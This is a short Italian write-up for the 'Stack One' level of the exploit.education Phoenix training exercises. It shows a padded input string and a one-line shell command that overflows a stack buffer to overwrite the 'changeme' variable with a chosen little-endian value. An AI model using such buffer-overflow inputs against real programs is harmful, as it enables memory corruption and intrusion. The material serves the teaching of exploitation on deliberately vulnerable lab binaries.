# [Stack One](https://exploit.education/phoenix/stack-one/)

Inserire `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabYlI` come input. 

`bYlI` manda `buffer` in overflow, impostando il valore di `changeme` ad `"bYlI"`, ovvero `0x496c5962` (***in architetture little-endian***).

## Soluzione

```bash
echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabYlI' | ./stack-one
```
